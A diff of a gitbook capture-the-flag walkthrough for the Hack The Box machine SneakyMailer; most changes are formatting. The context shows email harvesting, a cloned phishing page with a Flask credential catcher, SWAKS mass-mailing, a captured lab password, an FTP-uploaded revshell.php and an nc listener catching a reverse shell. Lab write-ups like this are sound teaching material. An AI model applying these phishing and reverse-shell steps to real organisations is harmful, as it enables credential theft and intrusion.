@@ -2,27 +2,23 @@
 
 The Hack The Box machine SneakyMailer is running a number of services; FTP \(port 21\), SSH \(port 22\), SMTP \(port 25\), HTTP \(port 80\), IMAP \(port 143\), IMAP TLS \(port 993\), HTTP \(port 8080\). The main website on port 80 has a team member list from which names and email addresses can be harvested to create a candidate user list. Running Gobuster on the site reveals a PHP file register.php
 
- a machine that simulates responding to a phishing attack to capture a user's credentials. Although we could use Gophish easily to achieve this, we will use another tool to send emails called SWAKS - Swiss Army Knife for SMTP \(https://github.com/jetmore/swaks\) and we will host the landing page in code that we will write ourselves.
+a machine that simulates responding to a phishing attack to capture a user's credentials. Although we could use Gophish easily to achieve this, we will use another tool to send emails called SWAKS - Swiss Army Knife for SMTP \([https://github.com/jetmore/swaks\](https://github.com/jetmore/swaks\)\) and we will host the landing page in code that we will write ourselves.
 
 Running an nmap scan, we find a number of ports open: FTP \(21\), SSH \(22\), SMTP \(25\), HTTP \(80\), IMAP \(143\), IMAP TLS \(993\), HTTP \(8080\)
 
-It seems the machine is running two websites and an email server supporting SMTP and IMAP. The FTP server does not support anonymous logon and so we can look at the main web server on port 80. Going to http://sneakymailer.htb, it redirects to the URL http://sneakycorp.htb and so we can add that name to the hosts file. Visiting that URL takes us to a landing page for SNEAKY CORP which is a Dashboard showing information about 2 projects, PyPi and POP3/SMTP \(Figure 3-29\).
+It seems the machine is running two websites and an email server supporting SMTP and IMAP. The FTP server does not support anonymous logon and so we can look at the main web server on port 80. Going to [http://sneakymailer.htb](http://sneakymailer.htb), it redirects to the URL [http://sneakycorp.htb](http://sneakycorp.htb) and so we can add that name to the hosts file. Visiting that URL takes us to a landing page for SNEAKY CORP which is a Dashboard showing information about 2 projects, PyPi and POP3/SMTP \(Figure 3-29\).
 
+!\[Graphical user interface, application, Teams
 
-
-![Graphical user interface, application, Teams
-
-Description automatically generated](../.gitbook/assets/10.png)
+Description automatically generated\]\(../.gitbook/assets/10.png\)
 
 Sneaky Corp Dashboard.
 
 The Team page gives a list of team members with email addresses \(Figure 3-30\)
 
+!\[Graphical user interface, text, application, email
 
-
-![Graphical user interface, text, application, email
-
-Description automatically generated](../.gitbook/assets/11%20%281%29.png)
+Description automatically generated\]\(../.gitbook/assets/11%20%281%29.png\)
 
 Sneaky Corp Team page.
 
@@ -65,8 +61,6 @@ We get a number of directories, the most interesting of which is pypi. We can ru
 
 Going to that page, we get an account registration page
 
-
-
 ![Sneaky Corp account registration](../.gitbook/assets/12%20%281%29.png)
 
 Filling out details and clicking register account does not seem to do anything. No account is added to the emails in the team page and there is nowhere to actually login. Likewise, the Logout function on the home page does not do anything either.
@@ -84,7 +78,7 @@ httrack http://sneakycorp.htb/pypi/register.php -o .
 This will copy a number of files but we can copy the register.html page created from the path sneakycorp.htb/pypi/register.html to the current directory
 
 ```bash
-cp sneakycorp.htb/pypi/register.html 
+cp sneakycorp.htb/pypi/register.html
 ```
 
 We are now going to write a simple application to host this page, capture any data that is sent to it and then redirect to the real registration page. To do this we will use Python and Flask.
@@ -114,7 +108,7 @@ To run the application, we just use
 sudo python3 app.py
 ```
 
-You can test the page by visiting http://127.0.0.1/pypi/register.php and submit the form. You should see the data being printed out and the page redirect to the sneakycorp.htb site.
+You can test the page by visiting [http://127.0.0.1/pypi/register.php](http://127.0.0.1/pypi/register.php) and submit the form. You should see the data being printed out and the page redirect to the sneakycorp.htb site.
 
 Now that we have the landing page, we need to send the phishing emails using the email list we scraped from the Sneaky Corp site. To do that, we are going to use SWAKS as mentioned before. We can write a script to read through the emails in the emails.txt file and send a message containing the URL for the phishing landing page:
 
@@ -190,7 +184,7 @@ ImmutableMultiDict([('firstName', 'Paul'), ('lastName', 'Byrd'), ('email', 'paul
 
 The user Paul Byrd with email address **paulbyrd@sneakymailer.htb** and password **^\(\#J@SkFv2\[%KhIxKk\(Ju\`hqcHl&lt;:Ht** responded to the phishing email.
 
-These credentials don't work with FTP or SSH but we can use them to connect to the mail server and read emails. 
+These credentials don't work with FTP or SSH but we can use them to connect to the mail server and read emails.
 
 {% hint style="info" %}
 To install Thunderbird use:
@@ -267,7 +261,7 @@ local: revshell.php remote: revshell.php
 ftp>
 ```
 
-Calling the file from http://dev.sneakycorp.htb/revshell.php will get a reverse shell on our listener:
+Calling the file from [http://dev.sneakycorp.htb/revshell.php](http://dev.sneakycorp.htb/revshell.php) will get a reverse shell on our listener:
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/SneakyMailer]
@@ -295,6 +289,4 @@ www-data@sneakymailer:/$ ^Z
 nc -lvnp 6001
 www-data@sneakymailer:/$
 ```
-
-
 
